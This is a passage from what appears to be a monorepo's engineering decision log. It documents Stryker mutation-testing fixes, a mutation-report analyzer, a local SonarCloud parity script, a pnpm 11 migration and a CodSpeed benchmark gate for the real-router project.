- **fsm + event-emitter + path-matcher:** added `stryker.config.mjs` + `vitest.stryker.config.mts` (modeled on logger's) and `test:mutation` / `test:mutation:report` scripts. Mutate `src/**/*.ts` minus the `index.ts` barrel and `types.ts`. Their unit/functional tests import via **relative paths** (`../../src/fsm.js`, `../../src/EventEmitter.js`, `../../src/SegmentMatcher`), which already resolve to the sandbox-mutated `src/` — so the self-alias is parity-only (kept for consistency and future package-name imports), not load-bearing here. path-matcher keeps its tests in `tests/unit/` (not `tests/functional/`); the `./tests/**/*.test.ts` include glob catches them regardless. path-matcher is also the **most likely to trip `break`**: by convention stryker runs only the `.test.ts` suite, and a large share of path-matcher's correctness is asserted in its property/stress suites — measure the unit-only score on first run before trusting the `60` floor.
- **search-params:** audited, no change needed — self-alias `"search-params"` already matches the (bare, internal) package name; mutate excludes (`index.ts`, `types.ts`, `strategies/index.ts`) and thresholds (90/80/70) are correct, and its functional tests exercise the full `searchParams`/`encode`/`decode`/`strategies`/`utils` surface.
- **rx** (`@real-router/rx`, a public **consumer** of core, not a foundation dep): added the same stryker setup. rx's own tests import via relative paths (parity-only self-alias), but rx imports its dependency `@real-router/core` — and the `@real-router/core/api` subpath — **by name** in both src and tests, so (like logger-plugin) the config aliases that dep to core's ORIGINAL (unmutated) src. Two refinements over logger-plugin's version: paths are computed from `import.meta.dirname` (**portable**, not hardcoded `/Users/...`), and the `@real-router/core/api` subpath gets its own alias listed **before** the bare `@real-router/core` so the more-specific entry matches first (`@rollup/plugin-alias` is first-match-wins). Mutate excludes the `index.ts` / `operators/index.ts` barrels and `types.ts`. Same property/stress-excluded caveat as path-matcher — measure before trusting the `60` floor.
- **No devDeps added.** Stryker is a root devDependency; logger ships zero stryker deps yet runs, because Node's upward `node_modules` traversal reaches root for both the `stryker` bin (root `.bin/stryker` is on PATH for any workspace script) and the `@stryker-mutator/*` plugins listed in `plugins`. fsm/event-emitter inherit the same resolution.

### Why

`break: 60` is intentionally conservative for fsm/event-emitter: the actual mutation score can't be measured without running Stryker (and only one Stryker run is safe at a time — concurrent runs in the same checkout contend), so a moderate floor avoids a spurious first-run failure. Both are foundation primitives with 100% coverage + property tests (event-emitter also stress tests), so the real score should sit well above the floor — tighten `break`/`low`/`high` after the first measured run. `.gitignore` already covers `.stryker-tmp/`, `packages/*/reports/`, and `.vitest-stryker`, so no ignore changes were needed.

## Mutation testing: explicit `plugins` + dep resolution via `internal-source` condition, NOT dep-aliases (logger-plugin, rx)

Two separate defects surfaced running `test:mutation` on `@real-router/logger-plugin`, then the second was found to also affect `@real-router/rx`. This section **supersedes the dep-alias guidance** in "Stryker self-alias must match the package name" above for these two packages — the manual workspace-dep aliases described there as correct are in fact the root cause of silently understated scores.

### Problem

**(1) Crash — missing `plugins` array.** `stryker run` in `logger-plugin` aborted at startup: `Could not inject [class CheckerWorker]. Cause: Cannot find Checker plugin "typescript". In fact, no Checker plugins were loaded.` The config set `checkers: ["typescript"]` but had no `plugins` array. Under pnpm's strict, non-hoisted `node_modules`, Stryker cannot auto-discover its plugins — they must be listed explicitly. logger-plugin was the **only** one of the 10 stryker configs missing it (its header says "based on router-error" — it predates the others gaining explicit `plugins`).

**(2) Silent false 0% — dep-aliases break vitest module dedup.** With (1) fixed, logger-plugin scored **63.57 %** with `plugin.ts` at **102 NoCoverage / 0 killed**, and rx had **~112 NoCoverage** (`state$`, `events$`, `debounceTime`, `takeUntil`, `map`, `filter`, `createOperator` all 0 killed). This is **not** a missing-test gap: normal `vitest` catches `plugin.ts` mutations (injecting a changed log string fails 4 tests). The pattern: source reached **only transitively** — via the barrel (`../../src` → `index` → `factory` → `plugin`) or driven through a workspace dep — loads a **second, non-instrumented module instance**, so Stryker's `stryMutAct(N)` never sees the active mutant. Source imported **directly by file path** (`../../../src/internal/*`, `../../src/RxObservable`) loads once and is killed normally. Bisection that pinned it: directly constructing `new LoggerPlugin()` from `../../src/plugin` in a sync test → **8 killed**; the identical class reached via `loggerPluginFactory()` (barrel) → **0 killed** → two copies of `plugin.ts` in one run. Tell-tale signature: the coverage counter still fires (so the file shows **Survived**, not NoCoverage, when imported via a shorter chain), but no mutant ever activates. Ruled out by experiment (none fixed it): `server.deps.inline`, `pool: "threads"` + `isolate: false` (broke the console-spy tests), a side-effect `import "../../src/plugin"`, and self-alias file-vs-dir form.

The trigger is the **manual cross-package dep-alias** itself (`@real-router/core` / `logger` / `core-types` → absolute or `../core/src` path). A hand-written alias to one absolute path, plus the dep's own resolution via the sandbox `node_modules` self-symlink, yields **two distinct resolved specifiers for the same file**, which Vite/Vitest do not dedupe → two module instances → diverging Stryker activation context. logger-plugin's `plugin.ts` imports `@real-router/core` only **type-only** (erased at runtime), yet the mere presence of the dep-aliases in the config still split its module graph — so the cause is config-level dedup breakage, not which file imports what.

### Solution

Replace the manual workspace-dep aliases with resolution via the existing `@real-router/internal-source` export condition (see "Custom `@real-router/internal-source` Export Condition" above). Keep **only** the load-bearing self-alias:

```js
resolve: {
  // workspace deps → their src via node_modules symlinks + the internal-source
  // export condition; ONE module graph, dedup intact. No manual dep-aliases.
  conditions: ["@real-router/internal-source", "import", "node"],
  alias: { "@real-router/<self>": resolve(__dirname, "./src" /* or ./src/index.ts */) },
},
```

- **logger-plugin:** added the `plugins` array (`@stryker-mutator/vitest-runner`, `@stryker-mutator/typescript-checker`) and switched to the condition. **63.57 % → 90.51 %**; `plugin.ts` 0 killed / 102 NoCoverage → **79 killed / 0 NoCoverage**; `internal/*` + `validation.ts` unchanged (no regression).
- **rx:** switched to the condition (dropping the `@real-router/core` + `@real-router/core/api` aliases). NoCoverage **112 → 5**, score **84.26 %**; `state$`/`events$`/`debounceTime`/`takeUntil`/`map`/`filter`/`createOperator` all now properly mutated. The `/api` subpath resolves through the condition without a dedicated alias (core's `exports["./api"]` declares `@real-router/internal-source`).
- **Scope:** audited all 10 stryker configs — logger-plugin and rx were the **only two** with cross-package dep-aliases (core/route-tree/fsm and the self-contained internal packages carry none). Both fixed; the residual survivors (logger-plugin 24, rx 29 + 5 NoCoverage) are now genuine mutation-score work, not artifacts.

### Why

The `@real-router/internal-source` condition is already how `tsc`, the normal Vitest config, and ESLint resolve workspace `@real-router/*` to `src/` — routing the stryker Vitest config through the same mechanism keeps a **single resolution path** (node_modules symlink → `src`) and therefore a single deduped module per file, so the instrumented module and the activation context stay the same object. A bespoke alias to a different absolute path is what forks them. Note the asymmetry with the normal `vitest.config.common.mts`, which deliberately uses `resolve.alias` (not `resolve.conditions`) to avoid a preact dual-package hazard from condition-order interference — that hazard doesn't apply to node-environment internal/plugin packages, so the simpler `conditions` form is safe here. The fix is **Stryker-only**: `vitest.stryker.config.mts` is read solely via `stryker.config.mjs`'s `vitest.configFile`; the normal `test` task uses `vitest.config.mts`, so application behavior and regular coverage are untouched. Failure-mode lesson: an understated mutation score from a resolution bug looks identical to weak tests — when a whole file reports 0 % / all-NoCoverage but its `vitest run --coverage` is green, suspect the sandbox module graph (inject a mutation and run the **normal** suite to confirm the tests are real before chasing "missing tests").

## Mutation-report analyzer: `scripts/mutation-analyze.mjs` (entanglement / disable-safety verdicts)

### Problem

The `/mutation-score` workflow had the model hand-write a throwaway node script to aggregate `reports/mutation-report.json` on **every** run — pure re-derivation cost. Worse, the single most error-prone step lived *outside* any script, in manual eyeballing: deciding whether a Survived mutant can take a `// Stryker disable next-line <Mutator>` **without** silencing a co-located Killed sibling. `disable next-line` is **mutator-level and column-blind** — it silences every mutant of that mutator on the line, regardless of column or replacement value. So if the same mutator has a Killed variant elsewhere on the line (entangled by value, e.g. `ConditionalExpression →true` killed + `→false` survived; or by column, e.g. one `StringLiteral "."` killed in `.split(".")` while another survives in `.includes(".")`), disabling drops a real kill silently. On the route-tree run this was checked by hand (a `dumpline` script run 3× + per-column comparison of killed-vs-survived), which is exactly the kind of structural bookkeeping a human gets wrong and a script never does.

### Solution

`scripts/mutation-analyze.mjs`, wired as `pnpm mutation:analyze <pkg | packages/dir | path-to-report.json>`:

- **Default mode** — status counts, package + **per-file** score (`Detected=Killed+Timeout`, `Valid=Detected+Survived+NoCoverage`, CompileError+Ignored excluded), and every Survived/NoCoverage mutant grouped by file → line:col → mutator (verbatim `replacement`), each tagged **DISABLE-SAFE** (no Killed/Timeout sibling of that mutator anywhere on the line → suppressing won't drop a kill; emits the exact paste-ready disable comment) or **ENTANGLED-KEEP** (a Killed sibling exists → document, don't disable).
- **`--lines <file>:n,n`** — dumps every mutant (all statuses) at the given lines for manual entanglement inspection / post-fix cross-check (the old `dumpline` step).
- Target resolution mirrors the skill: explicit `.json` → dir-with-`reports/` → `packages/<scope-stripped>` → scan `packages/*/package.json` for a matching `name` (so `@real-router/types` → `packages/core-types`, where dir ≠ name).
- No deps, pure node ESM. Registered via the root `mutation:analyze` script so `knip` (`lint:unused`) sees it as an entry and doesn't flag it; `scripts/` is outside the eslint glob (consistent with the other `scripts/*.mjs` dev tools).

### Why

The disable-safety verdict is a **pure structural function** of the report — "does mutator X have a Killed sibling on this line?" — computed exactly the way Stryker's `disable next-line` behaves (mutator-level, column-blind). Automating it removes a class of silent error (losing a kill by suppressing a still-partly-killed mutator) that prose guidance could only warn about. **Critically, the tool flags only STRUCTURAL safety, never equivalence:** DISABLE-SAFE means "you *may* suppress without losing a kill," not "this is an equivalent." The skill still mandates empirical proof (inject the mutation → full suite green) before any disable, so the tool cannot induce disable-theater — it narrows *where* to look, the model still proves *whether*. The score formula and the column-aware grouping match the skill verbatim, making the tool a faithful executable of what was previously re-authored ad-hoc each run.

## Local SonarCloud parity: `scripts/sonar-local.sh` (`pnpm sonar:local`)

### Problem

`pnpm sonar:local` was `pnpm type-check && pnpm test:coverage && pnpm sonar`, where `sonar` is a bare `dotenv -- sonar -Dsonar.login=$SONAR_TOKEN`. That predates #732/#735, which **removed** `sonar.sources` / `sonar.tests` / `sonar.javascript.lcov.reportPaths` / `sonar.projectVersion` from `sonar-project.properties` and made CI generate them dynamically (the `Get version`, `Compute Sonar scope`, and `Fix coverage paths` steps in `ci.yml`), passing them as scanner `-D` args that override the properties file. The local script never caught up, so it diverged from CI in two ways that make a local run **misleading, not just different**:

1. **No scope args** → with `sonar.sources` unset the scanner falls back to its default (`.`), analysing a different file set than CI's exact `packages/*/src` + `shared/*` list.
2. **No lcov path rewrite** → vitest writes package-relative `SF:src/…` (and shared owners write `SF:../../shared/…`); run from the repo root the scanner can't match those, so it reports **~0 % coverage** on new code and `sonar.qualitygate.wait=true` can red falsely.

### Solution

`scripts/sonar-local.sh` (wired as `sonar:local`) reproduces the three CI steps locally before invoking the scanner:

1. `projectVersion` from `packages/core/package.json` (CI "Get version").
2. `sources` / `tests` / `reports` parsed from `node scripts/check-coverage-scope.mjs --emit` — the **same source of truth** CI uses, so local scope and the codecov/sonar drift guard cannot disagree (CI "Compute Sonar scope").
3. lcov `SF:` rewrite to repo-root-relative, shared collapsed to `shared/<dir>/…` (CI "Fix coverage paths").

Then `exec pnpm exec dotenv -- sonar -Dsonar.projectVersion=… -Dsonar.sources=… -Dsonar.tests=… -Dsonar.javascript.lcov.reportPaths=…` — the scanner is invoked **directly**, not via `pnpm run sonar -- …`. `pnpm run <script> -- <args>` forwards the args behind a literal `--`, and `@sonar/scan` v4's commander CLI (which declares `-D, --define <property=value...>` and **zero positional arguments**) treats every token after `--` as a positional operand → `error: too many arguments. Expected 0 arguments but got 4.`. Calling `dotenv -- sonar -D…` passes the flags as plain options with no intervening `--`. Auth comes from the `SONAR_TOKEN` env var: `dotenv` loads it from `.env` into the child env and the scanner maps `SONAR_TOKEN` → `sonar.token` (`@sonar/scan/src/constants.js`), so no `-Dsonar.login` is passed (it is deprecated, and the prior `$SONAR_TOKEN` interpolation in the `sonar` package script expanded in a shell without `.env` loaded — i.e. always empty). The standalone `sonar` package script (`dotenv -- sonar -Dsonar.login=$SONAR_TOKEN`) is now orphaned and, if run alone, analyses the wrong scope (the properties file omits sources/tests/lcov by #732/#735) — prefer `pnpm sonar:local`.

Two portability/robustness points the CI steps don't need but a local script does:

- **BSD-sed safe** — CI uses GNU `sed -i`; the script writes to `"$lcov.tmp"` then `mv`s (no `-i`), and uses `-E` (honoured by both BSD sed on macOS dev and GNU sed on Linux/CI).
- **Idempotent** — a `grep -qE '^SF:(packages|shared)/'` guard skips an already-rewritten lcov, so a re-run that didn't regenerate coverage can't double the path prefix (CI is immune — fresh artifacts every run; local files persist between invocations).

### Why

Kept as a **manual command, not a pre-push hook**: the scanner UPLOADS to SonarCloud and (with `qualitygate.wait=true`) blocks on the server verdict, so wiring it into `pre-push` would add a network round-trip to every push, publish every local branch's analysis to the server ahead of CI, and re-run full coverage each time — while the bulk of Sonar's value is already enforced locally (SonarJS rules via `eslint-plugin-sonarjs`, duplication via `jscpd`/`lint:duplicates`, coverage via vitest). The unique server-side checks (new-code quality gate, security hotspots) already run in CI on every PR. So `sonar:local` exists to reproduce a CI Sonar result on demand, not to gate pushes.

### Coverage step uses `turbo run test`, never `-- --coverage` (drop of `test:coverage`)

**Problem.** The coverage step was `pnpm test:coverage` → `turbo run test -- --coverage`. But coverage is already config-enabled (`vitest.config.unit.mts` → `coverage.enabled: true`), so the passthrough flag adds nothing yet does two kinds of harm, and it directly contradicts `ci.yml`'s "Test with coverage" step, which runs plain `pnpm turbo run test test:properties` with an explicit comment forbidding the re-addition of `-- --coverage` (it wipes property-config lcov → 0 % coverage). So the "parity" script diverged from CI in a third way:

1. **Cache-buster → slow + maximal load.** `-- --coverage` hashes into the turbo task key, so the coverage run never reuses the warm `test` cache the pre-push/CI runs leave behind → cold full re-run of all ~34 packages every time.
2. **Native crash.** The forced cold miss makes *every* jsdom package (12 of them: react/preact/vue/solid/svelte/angular + browser-env/browser-plugin/dom-utils/hash-plugin/navigation-plugin/preload-plugin) execute v8-coverage concurrently (turbo `concurrency: 4` × `maxWorkers: 4` threads). Under that fd/memory peak, css-tree (a jsdom transitive dep) hits a Node **worker-thread** `node::fs::ReadFileUtf8` → `Assertion failed: (0) == (uv_fs_close(...))` native abort (observed as SIGKILL/exit 137). A single jsdom package run in isolation passes — the bug is load-induced, specific to `pool: "threads"`.

**Solution.** `sonar-local.sh` now runs `pnpm test` (= `turbo run test`); the root `test:coverage` script was removed (no remaining consumer; `packages/core` keeps its own unrelated `test:coverage`). Plain `test` emits the same lcov (config-enabled), reuses the cache, and — because warm-cache hits skip execution — keeps few packages actually running coverage at once, so the race effectively does not fire.

**Why not just fix the race.** The structural fix for the worker-thread abort is `pool: "forks"` (process isolation, already used in every `*.stress.mts`), but that slows unit runs and is only needed under the artificial all-cold-coverage load `-- --coverage` was manufacturing. With the flag gone the cold-everything case only recurs on a fresh clone / wiped turbo cache — identical to a normal cold `pnpm test`, which the suite already tolerates. Left as a documented follow-up rather than a speculative perf regression. See `scripts/sonar-local.sh` inline comment.

## pnpm 10.33 → 11.9 migration (config relocation + native OIDC publish)

### Problem

pnpm 11 stops reading behavioral config from `.npmrc` and the `package.json#pnpm`
field — both are now ignored with a warning, and `pnpm publish` no longer
delegates the registry upload/OIDC exchange to the bundled npm CLI (in pnpm 10
it did, which is why npm was previously listed in the toolchain as "used for
publishing"). Staying on pnpm 10 meant npm stayed in the release path and the
project missed pnpm 11's native OIDC + provenance publish and supply-chain
defaults.

### Solution

- **Config relocated to `pnpm-workspace.yaml`.** All 9 `.npmrc` settings →
  camelCase keys (`save-exact`→`saveExact`, `script-shell`→`scriptShell`,
  `loglevel` stays `loglevel`, etc.); `package.json#pnpm` (39 `overrides`,
  `peerDependencyRules`) moved verbatim; `onlyBuiltDependencies` +
  `ignoredBuiltDependencies` → the unified `allowBuilds` map (`true` = allowed,
  `electron-winstaller: false` = suppressed). The `package.json#pnpm` field is
  **deleted** (left in place it would be silently ignored). `.npmrc` is reduced
  to a comment (no auth/registry settings exist). The `@types/node: $@types/node`
  DRY-override keeps the `$` syntax (deprecated-but-works; catalog deliberately
  NOT adopted — syncpack already enforces single-version, and catalog breaks
  Dependabot). Driven by the `pnpm-v10-to-v11` codemod, then hand-verified.
- **`packageManager` pinned to `pnpm@11.9.0+sha512.<hex>`.** The codemod writes
  a bare version (and silently falls back to `11.0.1` if the registry is
  unreachable — below the OIDC-fix floor), so the version is written by hand and
  asserted `≥ 11.1.3`. The integrity hash is `+sha512.<128-hex>`, NOT the
  base64 SRI from `npm view … dist.integrity`; derive it with
  `node -e "process.stdout.write(Buffer.from(<sri>.replace(/^sha512-/,''),'base64').toString('hex'))"`
  (validated: decoding 10.33.0's SRI reproduces the old field's hash exactly).
- **`minimumReleaseAge: 0`** (pnpm 11 default is 1440 = 24h quarantine). Opted
  out: every dep is dev/build tooling and UI frameworks are peerDependencies
  (the consumer installs them) — nothing ships to users at runtime, so the
  quarantine adds no user-facing protection while it WOULD block Dependabot
  security PRs (`ERR_PNPM_NO_MATURE_MATCHING_VERSION`). Protection stays
  exact-pinning + deliberate bumps + PR review. NB: any explicit
  `minimumReleaseAge` auto-enables `minimumReleaseAgeStrict`; at `0` it's a
  no-op, but raising it later also needs the strict flag set deliberately.
- **CI: zero workflow version edits.** All 9 `pnpm/action-setup@v6` usages
  auto-detect the version from `packageManager`, so bumping that field switches
  every workflow to 11.9.0. The 3 `npm view … version` calls in `changesets.yml`
  → `pnpm view` (verified identical output for a `version` field query — the
  "published X ago" annotation only appears in the full summary view, not field
  queries; the `|| echo`/`|| continue` fallbacks still fire on exit 1).
  `scripts/smoke-test-packages.sh`'s `npm install` is left untouched — it is the
  deliberate "simulate a real npm consumer" coverage, not a build dependency.

### Why it's low-risk here (empirically verified, pnpm 11.9.0, isolated install)

- **Lockfile is byte-identical** under pnpm 11 (`--lockfile-only` produced the
  same `9.0` single-document file, same 1758 resolutions, same sha256). The
  multi-document lockfile class of breakage (turbo/osv/Dependabot parsers) does
  **not** apply: multi-doc only appears with `configDependencies`/
  `packageManagerDependencies`, which the repo has nowhere. `grep -c '^---$'
  pnpm-lock.yaml` = 0.
- **Clean `--frozen-lockfile` install passes with `strictDepBuilds: true`** —
  proving the `allowBuilds` map has no name typos (a wrong name fails the
  install) — and does **not** mutate the lockfile.
- **dep-tooling green**: `lint:deps` (syncpack), `lint:dedupe`, `lint:audit`
  (osv-scanner parses the v11 lockfile; 36 pre-existing Tauri RUSTSEC filters).

### Gotcha: the syncpack "Ignore pnpm overrides" group is NOT dead

The migration analysis assumed that, with `overrides` moved out of
`package.json#pnpm`, syncpack's `pnpmOverrides` ignore group would go dead and
could be deleted. **It cannot.** syncpack 15.x reads `overrides` from
`pnpm-workspace.yaml` too, so deleting the group makes `@types/node: $@types/node`
trip `SameRangeMismatch` against the pinned devDependency and fails `lint:deps`.
The group is kept (with a comment in `syncpack.config.mjs` recording this).

### What only a real release can confirm

OIDC trusted publishing on pnpm 11's native publish path cannot be validated by
`--dry-run` or verdaccio (neither performs the OIDC token exchange). The first
real changeset release is the gate — watch provenance generation. The hard floor
is 11.1.3 ([pnpm#11513](https://github.com/pnpm/pnpm/issues/11513) OIDC-404 fix);
11.9.0 also has the 11.5.3 package-manager-binary signature verification.

## Core Hot-Path Benchmark Gate — "2.5 engines" doctrine (tinybench + CodSpeed)

> Infra change, 2026-06-26. Implements `.claude/core-benchmark-strategy-rfc-ru.md`. Tooling/CI/tests only — no `packages/*/src/` change → straight to `master`, no changeset. Scope is ONLY `core` + its dependency cluster; the top-level `benchmarks/` directory (competitive suite) is untouched.

### Problem

Per-package benchmarks (`packages/*/tests/benchmarks/`, 10 packages, 55 `*.bench.ts`) were dead weight: all on **mitata**, runnable only via a local per-package `pnpm bench` (`tsx tests/benchmarks/index.ts`), and in core's entry only **2 of 13** files were even imported (the rest commented out). On top sat a **dead vitest-bench harness** — root `vitest.config.bench.mts` (plus a `packages/type-guards` sibling importing a `vitest.config.bench.mjs` that never existed) globbed `*.bench.ts` expecting vitest `bench()`, but the files use mitata `bench()`; no script ever invoked it. No workflow ran any of them — performance regressions were untracked. Worse, leaf microbenchmarks **dilute significance**: speeding up a leaf method in isolation says nothing about its weight on the real hot path.

### Solution

**Three benchmark engines, each for one job ("2.5 on the project"):**

| Engine | Role | Gate? |
|---|---|---|
| **mitata** | probe scripts + local ad-hoc wall-clock (developer tool) | no |
| **tinybench + `@codspeed/tinybench-plugin`** | hot-path regression gate for `core` (CodSpeed instrumentation) | **yes — per PR** |
| **vitest bench** | possible future *adapter* benches (framework render) | future |

"0.5" because vitest bench is an experimental wrapper over tinybench — in the gate we use tinybench directly, no wrapper.

Concretely:
- **Deleted** all 10 per-package `tests/benchmarks/` suites + their `"bench"` scripts, the dead vitest-bench harness (both `vitest.config.bench.mts` + the `vitest.config.common.mts` comment), and the now-orphaned `mitata` devDep (root + `sources` + `route-utils`).
- **Built** a gated hot-path suite in `packages/core/tests/benchmarks/` on tinybench. It measures the **synchronous** core hot path only (RFC §6.1 — async navigations are dominated by app-code awaits and mirror the optimistic-sync-execution invariant #307; gating their *instructions* would be double noise). Three axes: A = sync `navigate()` paths, B = route/tree worst-case shapes, C = view-layer (`buildPath`/`isActiveRoute`/`areStatesEqual`/`shouldUpdateNode`/`matchPath`).
- **Harvested** worst-case *inputs* (not code) from the path-matcher/route-tree leaf benches before deleting them (splat backtracking, percent-decode, wide tree, deep nesting, constraints, optional params) into `fixtures.ts`, so the macro-level core benches still traverse every expensive dependency branch.

**File = matcher form, process = isolation (RFC §9.2).** Megamorphism (mixing matcher option-forms at one call-site) is a *validity* problem under instrumentation, not just noise. So one router option-form per file (`default` / `strict-query` / `trailing-preserve` / `encoding-uricomponent` / `encoding-none`), and `run.ts` runs **each file in its own process** (`node --conditions=@real-router/internal-source --import tsx <file>`). Different route *data* under the *same* options stays in one file (realistic polymorphism). The old `index.ts` that imported every form into one process was the anti-pattern.

**Runs from `src`, no build.** `run.ts` injects `--conditions=@real-router/internal-source`, so `@real-router/*` workspace imports resolve to `src/` (live source) exactly as `tsc` does via `customConditions` — the suite needs no prior `dist/`. `tsx` is a pinned `core` devDep (the old `npx tsx` fetched it at runtime — a CI flake source the gate must not have).

### Why these choices

- **Why CodSpeed instrumentation, not wall-clock:** it measures simulated CPU instructions deterministically (<1% variance on shared CI runners), and differential profiling localizes a regression to the function *inside* the macro-bench — closing the "leaf bench dilutes significance" gap without keeping leaf benches.
- **Rejected: a mitata ↔ `@codspeed/core` bridge.** CodSpeed has no mitata plugin (no `@codspeed/mitata-plugin`; docs cover only vitest/tinybench/benchmark.js). mitata measures via a generator running its own JIT'd loop with no single-shot hook for an external instrumenter — bridging means rewriting mitata's engine. tinybench is monkeypatched cleanly by the official plugin. In the gate mitata's output/engine are unused anyway; only its `bench()` syntax would remain. Not worth it.
- **Gate measures instructions, not time.** A red check means "more instructions — verify wall-clock with a local mitata probe", not "slower". The hot path is allocation-heavy (AbortController, spreads, freeze); instruction counts track allocation paths well but not GC bandwidth. Wall-clock truth stays in local mitata.

### Discrepancies found vs the RFC (fixed correctly, not transcribed)

1. **`buildTree.ts` was NOT bench-only.** The RFC said delete each `tests/benchmarks/` wholesale "including `helpers/`". But `path-matcher/tests/benchmarks/helpers/buildTree.ts` was imported by **live stress tests** (`tests/stress/*.stress.ts`, 4 files). Deleting it wholesale broke them (caught by `knip` "unresolved imports"). Fixed by **relocating** `buildTree.ts` to `path-matcher/tests/helpers/` (next to `createTestMatcher.ts`) and repointing the 4 stress imports; the stress suite stays green (20/20).
2. **knip needs the bench files as project+entry.** The old `index.ts` *imported* the leaf benches, so knip saw `mitata` used. The new `run.ts` *spawns* files instead of importing them, so `tinybench`/`@codspeed/tinybench-plugin` looked unused. Fixed with a `packages/core` knip workspace block whose `entry` + `project` include `tests/benchmarks/*.ts` (a dependency counts as used only when imported by a **project** file).
3. **`tsx` added as an explicit `core` devDep** (the RFC listed only `tinybench` + the plugin) — see "runs from `src`" above.

### CI runner — committed; CodSpeed App install is the only remaining human step

Update (2026-06-26): the `CodSpeedHQ/action@v4` workflow **is now committed** (`.github/workflows/codspeed.yml`) — runs `pnpm -F @real-router/core bench` on `push: master` (baseline) + `pull_request` (compare) + `workflow_dispatch` (backtest). Two corrections vs the original plan below:
- **`mode: simulation` is mandatory.** The v4 action's `mode` input is `required` with no default — omitting it fails the run before any bench executes (the original draft workflow omitted it). `simulation` = Valgrind callgrind instruction counts, the deterministic gate instrument (vs `walltime`, which needs dedicated runners).
- **No `CODSPEED_TOKEN` for a public repo.** The token is "only required for private repositories"; real-router is public, so the workflow runs **tokenless** — no secret, no `id-token: write` permission. The earlier "create the token" step is moot (the secret was never added, and isn't needed).

Local verification done: the suite runs (6 files, all green) and `type-check` / `lint` / `knip` / `lint:deps` / `lint:dedupe` pass. The following require the maintainer:
- **Install the CodSpeed GitHub App** on the repo (https://codspeed.io) and link the project — the sole external prerequisite for results to upload. Until then the job runs green but reports nowhere.
- Confirm the first baseline records on `master`; run a PoC regression to confirm the gate goes red and localizes (RFC §9 step 5).
- Set per-bench thresholds *after* the first baseline (RFC §11.3 — strict ~3–5% for hot core, lenient ≥10% for edge cases).
- Empirically confirm process isolation holds under CodSpeed instrumentation (RFC §9.2).
- `@codspeed/tinybench-plugin@5.7.1 × tinybench@6.0.2` instrumentation compatibility is only verifiable under CodSpeed (local *execution* is verified).
